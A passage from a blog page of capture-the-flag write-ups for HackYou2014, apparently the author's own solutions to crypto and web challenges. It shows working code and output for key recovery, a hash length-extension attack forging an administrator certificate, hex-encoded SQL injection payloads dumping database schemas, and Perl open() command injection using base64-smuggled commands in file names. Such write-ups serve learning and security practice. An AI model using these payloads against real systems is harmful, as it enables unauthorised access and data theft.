    return ''.join(map(lambda x : ''.join(map(lambda y : pack('!H', y), x)), m))

def DecMatrix2str(m):  
    return ''.join(map(lambda x : ''.join(map(lambda y : pack('!B', y), x)), m))

def Generate(password):  
    random.seed(password)
    return [[random.randint(0,64) for i in xrange(4)] for j in xrange(4)]

def Multiply(A,B):  
    C = [[0 for i in xrange(4)] for j in xrange(4)]
    for i in xrange(4):
        for j in xrange(4):
            for k in xrange(4):
                C[i][j] += A[i][k] * B[k][j]
    return C

def Encrypt(fname,mkey):  
    key = Generate(5)
    data = open(fname, 'rb').read()
    length = pack('!I', len(data))
    while len(data) % 16 != 0:
        data += '\x00'
    out = open(fname + '.out', 'wb')
    out.write(length)
    for i in xrange(0, len(data), 16):
        cipher = Multiply(Str2matrix(data[i:i+16]), key)
        mclear = matrix(Str2matrix(data[i:i+16]))
        mcipher = matrix(cipher)
        mcipher = mclear*mkey
        out.write(Matrix2str(cipher))
    out.close()
    return cipher

def Decrypt(fname,key):  
    data = open(fname, 'rb').read()
    length = int(unpack('!I', data[0:4])[0])
    data = data[4:]
    out = open(fname + '.orig', 'wb')
    for i in xrange(0, len(data), 32):
        mdata = DecStr2matrix(data[i:i+32])
        clear = matrix(mdata)*key.I
        m = clear.round().tolist()
        m = [[int(item) for item in row] for row in m]
        out.write(DecMatrix2str(m))
    out.close()
    return clear

def ExtractKey(fname, clearstring):  
    data = open(fname, 'rb').read()
    cipher = data[4:36]
    clear = clearstring.decode("hex")
    mclear = matrix(Str2matrix(clear))
    mcipher = matrix(DecStr2matrix(cipher))
    mkey = mclear.I*mcipher
    return mkey

#Encrypt('flag.wmv')
ourkey = matrix(Generate(5))  
print"[+] Extract key"  
key = ExtractKey("flag.wmv.out", "3026b2758e66cf11a6d900aa0062ce6c")  
print("[+] Key:\n{0}".format(key))  
print"[+] Decrypt video"  
clear = Decrypt("flag.wmv.out",key)  
</code></pre>

<p>So running the script gets the vide decrypted:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto300&gt; python crack2.py  
[+] Extract key
[+] Key:
[[ 31.  51.  20.   0.]
 [ 53.  10.   6.  45.]
 [  3.  13.   3.  49.]
 [ 17.  48.  56.  31.]]
[+] Decrypt video
</code></pre>

<p><img src="../../../../content/images/octopress/crypto300.png" alt=""></p>
    </section>
</article>


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../">CTF</a>, <a href="../../../hackyou201458/">HackYou2014</a>, <a href="../../../crypto/">Crypto</a></span>
        <h2 class="post-title"><a href="../../../../blog/2014/01/16/hackyou2014-crypto200-write-up/">#hackyou2014 Crypto200 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto200">level</a> we are said that our challange is login with administrator role in a service listening on hackyou2014tasks.ctf.su 7777 <br>
We are given the following source code:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
from math import sin  
from urlparse import parse_qs  
from base64 import b64encode  
from base64 import b64decode  
from re import match

SALT = ''  
USERS = set()  
KEY = ''.decode('hex')

def xor(a, b):  
    return ''.join(map(lambda x : chr(ord(x[0]) ^ ord(x[1])), zip(a, b * 100)))

def hashme(s):  
    #my secure hash function
    def F(X,Y,Z):
        return ((~X &amp; Z) | (~X &amp; Z)) &amp; 0xFFFFFFFF
    def G(X,Y,Z):
        return ((X &amp; Z) | (~Z &amp; Y)) &amp; 0xFFFFFFFF
    def H(X,Y,Z):
        return (X ^ Y ^ Y) &amp; 0xFFFFFFFF
    def I(X,Y,Z):
        return (Y ^ (~Z | X)) &amp; 0xFFFFFFFF
    def ROL(X,Y):
        return (X &lt;&lt; Y | X &gt;&gt; (32 - Y)) &amp; 0xFFFFFFFF

    A = 0x67452301
    B = 0xEFCDAB89
    C = 0x98BADCFE
    D = 0x10325476
    X = [int(0xFFFFFFFF * sin(i)) &amp; 0xFFFFFFFF for i in xrange(256)]

    for i,ch in enumerate(s):
        k, l = ord(ch), i &amp; 0x1f
        A = (B + ROL(A + F(B,C,D) + X[k], l)) &amp; 0xFFFFFFFF
        B = (C + ROL(B + G(C,D,A) + X[k], l)) &amp; 0xFFFFFFFF
        C = (D + ROL(C + H(D,A,B) + X[k], l)) &amp; 0xFFFFFFFF
        D = (A + ROL(D + I(A,B,C) + X[k], l)) &amp; 0xFFFFFFFF

    return ''.join(map(lambda x : hex(x)[2:].strip('L').rjust(8, '0'), [B, A, D, C]))

def gen_cert(login):  
    global SALT, KEY
    s = 'login=%s&amp;role=anonymous' % login
    s += hashme(SALT + s)
    print("decrypted cert: %s" % s)
    s = b64encode(xor(s, KEY))
    print("encrypted cert: %s" % s)
    return s

def register():  
    global USERS
    login = raw_input('Your login: ').strip()
    if not match('^[\w]+$', login):
        print '[-] Wrong login'
        return
    if login in USERS:
        print '[-] Username already exists'
    else:
        USERS.add(login)
        print '[+] OK\nYour auth certificate:\n%s' % gen_cert(login)

def auth():  
    global SALT, KEY
    cert = raw_input('Provide your certificate:\n').strip()
    try:
        cert = xor(b64decode(cert), KEY)
        print cert
        auth_str, hashsum = cert[0:-32], cert[-32:]
        print auth_str
        print hashsum
        if hashme(SALT + auth_str) == hashsum:
            data = parse_qs(auth_str, strict_parsing = True)
            print '[+] Welcome, %s!' % data['login'][0]
            if 'administrator' in data['role']:
                flag = open('flag.txt').readline()
                print flag
        else:
            print '[-] Auth failed'
    except:
        print '[-] Error'


def start():  
    while True:
        print '======================'
        print '[0] Register'
        print '[1] Login'
        print '======================'
        num = raw_input().strip()
        if num == '0':
            register()
        elif num == '1':
            auth()

start()  
</code></pre>

<p>The service generates certificate when you register that you need to present in order to login in. <br>
The certificate is a XOR encrypted version of the following string:</p>

<pre><code class="language-lang-bash line-numbers ">login=&lt;login&gt;&amp;role=anonymous&lt;salted hash of login+role string&gt;  
</code></pre>

<p>The problem is that we dont know the encryption key nor the hash salt. So let's take it one step at a time:</p>

<h2 id="gettingthekeytothekingdom">Getting the key to the kingdom</h2>

<p>Getting the key was the easy part as the cert is encrypted in an ECB way, we only need to send a login name long enough so that the whole key is xored with our know long login name, so we register the user:</p>

<pre><code class="language-lang-bash line-numbers ">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
</code></pre>

<p>And get the cert:</p>

<pre><code class="language-lang-bash line-numbers ">RK5yZMJaRRl8LVBk5mx9xmVfPhXWqPlNObWPakmd6mpMs0qh6p9KVhBr0hqGJCE9tKRpgFRM7SZFGXwtUGTmbH3GZV8+Fdao+U05tY9qSZ3qakyzSqHqn0pWEGvSGoYkIT20pGmAVEztJkUZfC1QZOZsfcZlXz4V1qj5TTm1j2pJnepqTLNKoeqfSlYQa9IahiQhPbSkaYBUTO0mRRl8LVBk5mx9xmVfPhXWqPlNObWPakmd6mpMs0qh6p9KVhBr0hqGJCE9tKRpgFRM7SZFGXwtUGTmbH3GZV8+Fdao+U05tY9qSZ3qakyzSqHqn0pWEGvSGoYkIT20pA6zemHJWmU2UgJoSMhYT7cXe0kyoN7cakrNq0lu7MgSaJYz0p/rb3NpE6FqpgZQ  
</code></pre>

<p>Now if we xor the two together (adding "login=" before the login name) we get the key and since our login name was long enough we can extract the key that is repeated several times:</p>

<pre><code class="language-lang-bash line-numbers ">28c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e5  
</code></pre>

<p>Now we can decrypt our cert and extrack the login string and hashsum:</p>

<pre><code class="language-lang-bash line-numbers ">[+] Credentials: login=pwntester&amp;role=anonymous
[+] Hashsum: 3e4d482fd5ce578af79312466b50b8f6
</code></pre>

<h2 id="puttingsomesalt">Putting some salt</h2>

<p>Our goal is to submit an "administrator" version of the string so we need to know the <strong>salt</strong> in order to produce the right hash that is going to be checked in the server ... or not? <br>
Well, actually, the hashing function is not reversible and no collisions are found easy, but there is still hope in the way of <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Length extension attacks</a>. Actually is even simpler since we dont have to care about the padding! <br>
Ok, so here is the idea.</p>

<ul>
<li>The Hashing state machine starts in a initial state (that we know, check A,B,C,D in the hashme function)</li>
<li>The hashing machine iterates over all the characters (abcd) and ends in a different state that is returned as the hashsum</li>
<li>If we extend the original characters (abcd1234) and pass it to the hash function, we can do two things:
<ul><li>Start from scratch, reset the hash FSM, and calculate process it till there are no more characters and we return the last state in the form of a hashsum</li>
<li>Since we already hashed some characters and know the machine state, we can modify the hash FSM so its initial state is the one returned when we hashed (abcd) and then just continue from that state with the new characters (1234) until there are no more characters and we return the state in the form of a hashsum</li></ul></li>
</ul>

<p>Well, the server is going to do the first approach, but we can do the second without knowing the Salt!! So we know that "login=pwntester&amp;role=anonymous" hash is 3e4d482fd5ce578af79312466b50b8f6.</p>

<p>Lets say we want to calculate the hash of "login=pwntester&amp;role=anonymousNEWSTUFFHERE", we can reset the Hash machine so its initial state is 3e4d482fd5ce578af79312466b50b8f6 and then just hash the "NEWSTUFFHERE", the result will be the same hash as hashing the whole string.</p>

<p>Now, if we focus on the auth() method:</p>

<pre><code class="language-lang-python line-numbers ">def auth():  
    global SALT, KEY
    cert = raw_input('Provide your certificate:\n').strip()
    try:
        cert = xor(b64decode(cert), KEY)
        print cert
        auth_str, hashsum = cert[0:-32], cert[-32:]
        print auth_str
        print hashsum
        if hashme(SALT + auth_str) == hashsum:
            data = parse_qs(auth_str, strict_parsing = True)
            print '[+] Welcome, %s!' % data['login'][0]
            if 'administrator' in data['role']:
                flag = open('flag.txt').readline()
                print flag
        else:
            print '[-] Auth failed'
    except:
        print '[-] Error'
</code></pre>

<p>We can see that the auth string is parsed as a query string (parse_qs) so if we pass different parameters with the same name, they will be treated as an array. <br>
Then the "if 'administrator' in data['role']" will pass if one of them is <strong>administrator</strong></p>

<p>So now we know what we need to hash:</p>

<pre><code class="language-lang-bash line-numbers ">login=pwntester&amp;role=anonymous&amp;role=administrator  
</code></pre>

<p>This is the function I wrote to hash from a given state:</p>

<pre><code class="language-lang-python line-numbers ">def hashmeFromState(s,hash,init):  
    #my secure hash function
    def F(X,Y,Z):
        return ((~X &amp; Z) | (~X &amp; Z)) &amp; 0xFFFFFFFF
    def G(X,Y,Z):
        return ((X &amp; Z) | (~Z &amp; Y)) &amp; 0xFFFFFFFF
    def H(X,Y,Z):
        return (X ^ Y ^ Y) &amp; 0xFFFFFFFF
    def I(X,Y,Z):
        return (Y ^ (~Z | X)) &amp; 0xFFFFFFFF
    def ROL(X,Y):
        return (X &lt;&lt; Y | X &gt;&gt; (32 - Y)) &amp; 0xFFFFFFFF


    B = int(hash[0:8], 16)
    A = int(hash[8:16], 16)
    D = int(hash[16:24], 16)
    C = int(hash[24:32], 16)

    X = [int(0xFFFFFFFF * sin(i)) &amp; 0xFFFFFFFF for i in xrange(256)]

    i = init
    for j,ch in enumerate(s):
        # We add the length of the previous state (we dont know secret length so we have to brute force it) to restaurate the state
        k, l = ord(ch), i &amp; 0x1f
        if j==0:
            print("hashmeext pos:{0} char:{1} l:{2}".format(j,ch,l))
        A = (B + ROL(A + F(B,C,D) + X[k], l)) &amp; 0xFFFFFFFF
        B = (C + ROL(B + G(C,D,A) + X[k], l)) &amp; 0xFFFFFFFF
        C = (D + ROL(C + H(D,A,B) + X[k], l)) &amp; 0xFFFFFFFF
        D = (A + ROL(D + I(A,B,C) + X[k], l)) &amp; 0xFFFFFFFF
        i += 1

    return ''.join(map(lambda x : hex(x)[2:].strip('L').rjust(8, '0'), [B, A, D, C]))
</code></pre>

<p>Note that we dont know the length of the Salt, so we need to brute force it to initialize the hash FST in the right state. After running the script against the live service, we get that the right length is 18:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto200&gt; python crack.py  
[+] Concatenated key (250 bytes): 28c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e528c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e5
[+] Key: 28c1150dac6704583d6c1125a72d3c87241e7f5497e9b80c78f4ce2b08dcab2b0df20be0abde0b17512a935bc765607cf5e5
[+] Credentials: login=pwntester&amp;role=anonymous
[+] Hashsum: 3e4d482fd5ce578af79312466b50b8f6
[+] User Credentials: login=pwntester&amp;role=anonymous3e4d482fd5ce578af79312466b50b8f6
[+] User Cert: RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vmE45lj/YmbhvIjJPpmz/BAZLzNYZ8yE7mgUxaF9UdxM=
[-] Auth failed
hashmeext pos:0 char:&amp; l:1  
[+] Admin Credentials (secret length=1: login=pwntester&amp;role=anonymous&amp;role=administrator72d2e3d8de7b390f146cc6b5e8552ea8)
[+] Admin Cert (secret length=1: RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9IapSdonwM8PFhbcxaeHVq2ECgcN6GLjWlAwfsZbb2T)
[+] Admin Cert decoded (secret length=1: login=pwntester&amp;role=anonymous&amp;role=administrator72d2e3d8de7b390f146cc6b5e8552ea8)

...
...
...

[-] Auth failed
hashmeext pos:0 char:&amp; l:18  
[+] Admin Credentials (secret length=18: login=pwntester&amp;role=anonymous&amp;role=administrator6ca059630c51cb32e3d791aeca560eae)
[+] Admin Cert (secret length=18: RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9NLoCU4lVE3aF5ZIEbFHg7iF3pIbaaI3W8Zwfgbbb3O)
[+] Admin Cert decoded (secret length=18: login=pwntester&amp;role=anonymous&amp;role=administrator6ca059630c51cb32e3d791aeca560eae)

[+] Welcome
Eureka!!  
</code></pre>

<p>Now we can use the cert to login and get the flag:</p>

<pre><code class="language-lang-bash line-numbers ">RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9NLoCU4lVE3aF5ZIEbFHg7iF3pIbaaI3W8Zwfgbbb3O  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto200&gt; nc hackyou2014tasks.ctf.su 7777                                                                                                                                                                                                            1  
======================
[0] Register
[1] Login
======================
1  
Provide your certificate:  
RK5yZMJadC9TGHRW00hOoVZxEzGqiNZjFo2jRH2vjVlinm7dyrpmfj9D4C+1BBQTh9NLoCU4lVE3aF5ZIEbFHg7iF3pIbaaI3W8Zwfgbbb3O  
[+] Welcome, pwntester!
CTF{40712b12d4be002e20f51424309a068c}  
</code></pre>
    </section>
</article>


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../">CTF</a>, <a href="../../../hackyou201458/">HackYou2014</a>, <a href="../../../crypto/">Crypto</a></span>
        <h2 class="post-title"><a href="../../../../blog/2014/01/16/hackyou2014-crypto100-write-up/">#hackyou2014 Crypto100 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto100">level</a> we are asked to break a code and decrypt <a href="http://hackyou.ctf.su/files/crypto100.zip">msg002.enc</a>. We are given the encryptor code without the key:</p>

<pre><code class="language-lang-clike line-numbers ">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv) {  
    if (argc != 3) {
        printf("USAGE: %s INPUT OUTPUT\n", argv[0]);
        return 0;
    }
    FILE* input  = fopen(argv[1], "rb");
    FILE* output = fopen(argv[2], "wb");
    if (!input || !output) {
        printf("Error\n");
        return 0;
    }
    char k[] = "CENSORED";
    char c, p, t = 0;
    int i = 0;
    while ((p = fgetc(input)) != EOF) {
        c = (p + (k[i % strlen(k)] ^ t) + i*i) &amp; 0xff;
        t = p;
        i++;
        fputc(c, output);
    }
    return 0;
}
</code></pre>

<p>And we are also given a plaintext (msg001) and its corresponding cryptotext (msg001.enc) so we can easily extract the key with something like:</p>

<pre><code class="language-lang-clike line-numbers ">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv) {  
    if (argc != 2) {
        printf("USAGE: %s CRYPTO \n", argv[0]);
        return 0;
    }
    FILE* input  = fopen(argv[1], "rb");
    if (!input) {
        printf("Error\n");
        return 0;
    }

    char c, p, t = 0;
    int i = 0;

    // We use the following loop to get the key knowing the cryptotext(input) and plaintaext(w[])
    char w[] = "Hi! This is only test message";
    unsigned int j = 0;
    while ((p = fgetc(input)) != 0) {
        // printf("read %d", p);
        for (j=31;j&lt;125;j++) {
            c = (p - (j ^ t) - i*i) &amp; 0xff;
            if (c == w[i]) {
                printf("%c\n",j);
                t = c;
                i++;
                break;
            }
        }
    }
    return 0;
}
</code></pre>

<p>The resulting key is: <strong>VeryLongKeyYouWillNeverGuess</strong> <br>
Now we can use a decryptor to extract msg002:</p>

<pre><code class="language-lang-clike line-numbers "> #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;

 int main(int argc, char **argv) {
    if (argc != 3) {
         printf("USAGE: %s INPUT OUTPUT\n", argv[0]);
         return 0;
     }
     FILE* input  = fopen(argv[1], "rb");
     FILE* output = fopen(argv[2], "wb");
     if (!input || !output) {
         printf("Error\n");
         return 0;
     }


     char c, p, t = 0;
     int i = 0;

    char k[] = "VeryLongKeyYouWillNeverGuess";
    i = 0;
    c, p, t = 0;
    int g = 0;
    while ((p = fgetc(input)) != 1) {
        c = (p - (k[i % strlen(k)] ^ t) - i*i) &amp; 0xff;
         printf("Decrypting %x i=%d t=%d k=%d -&gt; %d\n",p,i,t,(k[i % strlen(k)] ^ t),c);
        t = c;
        i++;
         //printf("%c",c);
         fputc(c, output);
         g++;
         if (g&gt;450) {break;}
    }

    return 0;
 }
</code></pre>

<p>And the results are:</p>

<blockquote>
  <p>The known-plaintext attack (KPA) is an attack model for cryptanalysis where the attacker has samples of both the plaintext (called a crib), and its encrypted version (ciphertext). These can be used to reveal further secret information such as secret keys and code books. The term "crib" originated at Bletchley Park, the British World War II decryption operation.
  The flag is CTF{6d5eba48508efb13dc87220879306619}</p>
</blockquote>
    </section>
</article>


<article class="post tag-ctf tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../">CTF</a>, <a href="../../../php/">PHP</a>, <a href="../../../hackyou201458/">HackYou2014</a></span>
        <h2 class="post-title"><a href="../../../../blog/2014/01/16/hackyou2014-web100-write-up/">#hackyou2014 Web100 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou2014tasks.ctf.su:10080/">level</a> we are presented with some logos we can vote.</p>

<p><img src="../../../../content/images/octopress/web100-1.png" alt=""></p>

<p>If we look at the source code we can see an interesting comment:</p>

<pre><code class="language-lang-html line-numbers ">...
&lt;!-- TODO: remove index.phps --&gt;  
...
</code></pre>

<p>We can grab the source code:</p>

<pre><code class="language-lang-php line-numbers "> &lt;?php
include 'db.php';  
session_start();  
if (!isset($_SESSION['login'])) {  
    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
}
$login = $_SESSION['login'];

if (isset($_POST['submit'])) {  
    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
        die('Hacking attempt!');
    $id = $_POST['id'];
    $vote = (int)$_POST['vote'];
    if ($vote &gt; 5 || $vote &lt; 1)
        $vote = 1;
    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';
    echo '&lt;table border="1"&gt;';
    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
    while ($r = mysql_fetch_array($q)) {
        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
        echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
        echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;';
    }
    echo '&lt;/table&gt;';
    echo '&lt;br&gt;&lt;a href="index.php"&gt;Back&lt;/a&gt;&lt;br&gt;';
    exit;
}
&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Picture Gallery&lt;/title&gt;
&lt;/head&gt;  
&lt;body&gt;  
&lt;p&gt;Welcome, &lt;?php echo $login; ?&gt;&lt;/p&gt;  
&lt;p&gt;Help us to choose the best logo!&lt;/p&gt;  
&lt;form action="index.php" method="POST"&gt;  
&lt;table border="1" cellspacing="5"&gt;  
&lt;tr&gt;  
$q = mysql_query('SELECT * FROM picture');
while ($r = mysql_fetch_array($q)) {  
    echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';
}
&lt;/tr&gt;  
&lt;/table&gt;  
&lt;p&gt;Your vote:  
&lt;select name="vote"&gt;  
&lt;option value="1"&gt;1&lt;/option&gt;  
&lt;option value="2"&gt;2&lt;/option&gt;  
&lt;option value="3"&gt;3&lt;/option&gt;  
&lt;option value="4"&gt;4&lt;/option&gt;  
&lt;option value="5"&gt;5&lt;/option&gt;  
&lt;/select&gt;&lt;/p&gt;  
&lt;input type="submit" name="submit" value="Submit"&gt;  
&lt;/form&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
&lt;!-- TODO: remove index.phps --&gt;  
</code></pre>

<p>We cannot inject in <strong>vote</strong> because it is casted to an integer and the value is verified but we can inject in <strong>id</strong> if we can bypass the <strong>is_numeric</strong> function. Actually, it was quite easy, we can submit hexadecimal values and benefit from how <strong>mysql</strong> handles <a href="http://dev.mysql.com/doc/refman/5.0/en/hexadecimal-literals.html">hex literals</a>. <br>
We can verify the injection submiting:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729  
999999999999 union all (select 'Hello!!')  
</code></pre>

<p>The server will return:</p>

<p><img src="../../../../content/images/octopress/web100-2.png" alt=""></p>

<p>Ok, now we can try something more interesting:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428736368656d615f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e736368656d61746129  
999999999999 union all (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)  
</code></pre>

<pre><code class="language-lang-html line-numbers ">information_schema,mysql,performance_schema,task,test  
</code></pre>

<p>From "task"</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e434154287461626c655f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d20277461736b2729  
999999999999 union all (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'task')  
</code></pre>

<pre><code class="language-lang-html line-numbers ">Flag,picture,vote  
</code></pre>

<p>Now the columns:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f736368656d61203d20277461736b2720616e64207461626c655f6e616d653d27466c61672729  
999999999999 union all (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'task' and table_name='Flag')  
</code></pre>

<pre><code class="language-lang-html line-numbers ">flag  
</code></pre>

<p>And finally:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428666c6167292066726f6d20466c616729  
999999999999 union all (SELECT GROUP_CONCAT(flag) from Flag)  
</code></pre>

<pre><code class="language-lang-html line-numbers ">CTF{820178c33c03aaa7cfe644c691679cf8}  
</code></pre>
    </section>
</article>


<article class="post tag-ctf tag-web tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-15">15 Jan 2014</time> on <a href="../../">CTF</a>, <a href="../../../web/">Web</a>, <a href="../../../php/">PHP</a>, <a href="../../../hackyou201458/">HackYou2014</a></span>
        <h2 class="post-title"><a href="../../../../blog/2014/01/15/hackyou2014-web200-write-up/">#hackyou2014 Web200 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou2014tasks.ctf.su:20080/">level</a> we are presented with a typical Snake game.</p>

<p><img src="../../../../content/images/octopress/snake.png" alt=""></p>

<p>I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the <strong>X-Forwarded-For</strong> header. <br>
That was pretty much it until the CTF was about to finish when I was given the hint: "../". I could use it to locate a LFI vulnerability that was affecting the <strong>index.php?ip</strong> parameter so I was capable of reading <strong>index.pl</strong>:</p>

<p><img src="../../../../content/images/octopress/indexpl.png" alt=""></p>

<p>Reviewing the code we spot the LFI in line 4:</p>

<pre><code class="language-lang-bash line-numbers ">$login = $session-&gt;param('login');
print $req-&gt;p('Hello, '.$login.'!');  
if ($req-&gt;param('ip')) {  
    $file = './data/'.MD5($login)."/".$req-&gt;param('ip');
    if (-e $file) {
        open FILE, $file;
        $html = '';
        while (&lt;FILE&gt;) {
            $html .= $_;
        }
        close(FILE);
        print $req-&gt;start_table({border=&gt;1});
        print $req-&gt;Tr($req-&gt;th(['Date', 'Score']));
        print $html;
        print $req-&gt;end_table();
        print $req-&gt;a({href=&gt;'index.pl'}, 'Back');
    } else {
        print $req-&gt;h1('Error');
    }
}
</code></pre>

<p>But also there is another interesting "feature" if $file exists then it will be opened and since perl <strong>open()</strong> command in line 6 allow us to inject commands using pipes, we can execute any arbitrary command. Problem is that $file needs to exist so how can we create a random file there? Well, we can use our ability to submit random IPs with <strong>X-Forwarded-For</strong>:</p>

<p><img src="../../../../content/images/octopress/web200-1.png" alt=""></p>

<p>Now if we go to index.pl?ip=|pwd| we will get:</p>

<p><img src="../../../../content/images/octopress/web200-2.png" alt=""></p>

<p>Nice! However we cannot create files containing a slash ("/"):</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|pwd|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls .|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls ..|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls /|")'  
fusion@fusion:~/test$ ls  
|ls ..|  |ls .|  |pwd|
</code></pre>

<p>No backslashes neither:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|`echo -e '\x6c\x73\x20\x2f'`|")'  
fusion@fusion:~/test$ ls  
|`echo -e x6cx73x20x2f`|  |ls ..|  |ls .|  |pwd|
</code></pre>

<p>Lets try base64:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|`echo bHMgLw== | base64 -d`|")'  
fusion@fusion:~/test$ ls  
|`echo -e x6cx73x20x2f`|  |`echo bHMgLw== | base64 -d`|  |ls ..|  |ls .|  |pwd|
</code></pre>

<p>Cool! lets submit it:</p>

<p><img src="../../../../content/images/octopress/web200-3.png" alt=""></p>

<p>And fetch our recompense:</p>

<p><img src="../../../../content/images/octopress/web200-4.png" alt=""></p>
    </section>
</article>


<nav class="pagination" role="navigation">
        <a class="newer-posts" href="../../"><span aria-hidden="true">←</span> Newer Posts</a>
    <span class="page-number">Page 2 of 4</span>
        <a class="older-posts" href="../3/">Older Posts <span aria-hidden="true">→</span></a>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
